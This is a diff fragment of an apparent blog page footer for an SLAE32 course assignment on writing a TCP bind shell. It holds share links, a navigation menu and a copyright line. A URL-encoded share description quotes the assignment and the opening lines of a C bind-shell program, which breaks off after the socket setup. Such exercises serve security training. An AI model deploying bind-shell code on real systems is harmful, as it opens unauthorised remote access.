+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&name=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell&description=The%20sixth%20assigment%20for%20the%20SLAE32%20certification%20asks%20to%20write%20a%20TCP%20Bind%20Shell%20shellcode%20that%20binds%20to%20a%20port%20and%20then%20executes%20a%20shell%20on%20the%20incoming%20connection.%20Requirement%20is%20that%20port%20number%20should%20be%20easily%20configurable.%0aTCP%20Bind%20Shell%20in%20C%20Let%26rsquo%3bs%20first%20of%20all%20create%20a%20TCP%20bind%20shell%20in%20C%20that%20listens%20to%20port%204444.%20This%20is%20the%20code%3a%0a%23include%20%26lt%3bstdio.h%26gt%3b%23include%20%26lt%3bsys%2fsocket.h%26gt%3b%23include%20%26lt%3bnetinet%2fip.h%26gt%3b%23include%20%26lt%3bunistd.h%26gt%3b%20int%20main%20%28%29%7b%20%2f%2f%20Creating%20File%20Descriptor%20for%20the%20Socket%09%09int%20socket_fd%3b%20socket_fd%20%3d%20socket%28AF_INET%2c%20SOCK_STREAM%2c%200%29%3b%20%2f%2f%20Binding%20the%20socket%20to%20server%20address%20%09struct%20sockaddr_in%20server_address%3b%20server_address.">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fandrea-perfetti.github.io%2fposts%2fslae32-exam%2f2021-03-14-slae32-assignment-1%2f&t=SLAE32%20-%20Assignment%201%20-%20TCP%20Bind%20Shell">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Andrea Perfetti 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Posts</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="https://www.andreaperfetti.it/">About me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
